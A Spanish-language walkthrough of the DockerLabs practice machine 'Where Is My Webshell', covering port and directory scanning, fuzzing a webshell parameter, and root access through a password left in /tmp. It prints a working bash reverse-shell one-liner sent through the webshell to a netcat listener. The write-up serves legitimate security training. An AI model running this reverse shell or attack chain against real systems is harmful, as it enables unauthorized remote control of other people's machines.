---
title: "DockerLabs - Where Is My Webshell"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio para practicar la localización y subida de una webshell para ganar acceso, con escalada de privilegios mediante sudo.

## Reconocimiento

Empezamos con un escaneo de puertos y versiones:

```bash
nmap -sCV -p- 172.17.0.2
```

Detectamos el puerto 80 con Apache. Para listar directorios usamos `gobuster`:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -x php,html,zip,bak,txt,py,xml,log -t 40
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,bak,txt,py,xml,log -t 40
```

Con estos dos comandos descubrimos que existe un `warning.html` y un `shell.php`. Entramos al `warning.html` y obtenemos una pista: en `/tmp` hay un secreto escondido y un hacker anterior ya había tenido acceso con una webshell.

## Explotación

Usamos `ffuf` para fuzzear los parámetros de `shell.php` y descubrir cuál nos da acceso a la webshell:

```bash
ffuf -u http://172.17.0.2/shell.php\?FUZZ\=id \
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -e .php \
    -fc 404 \
    -fs 0 \
    -t 50
```

Nos muestra el parámetro `parameter`. Usando este mismo parámetro deberíamos poder ejecutar comandos en la máquina, y así es. Abrimos un puerto con `netcat` en nuestro terminal y lanzamos una reverse shell mediante el parámetro:

```bash
nc -lnvp 1234
```

```bash
http://172.17.0.2/shell.php?parameter=bash -c 'bash -i >%26 /dev/tcp/172.17.0.1/1234 0>%261'
```

Esto nos abre una terminal bash con el usuario `www-data`.

## Escalada de privilegios

Usando la pista anterior, listamos el contenido de `/tmp`:

```bash
ls -la /tmp
```

Obtenemos un archivo llamado `.secret.txt`:

```bash
cat /tmp/.secret.txt
```

Se trata de la contraseña de root, así que ejecutamos `su root` e introducimos la contraseña, obteniendo así acceso como root a la máquina.

## Conclusión

Laboratorio finalizado: acceso a root conseguido.
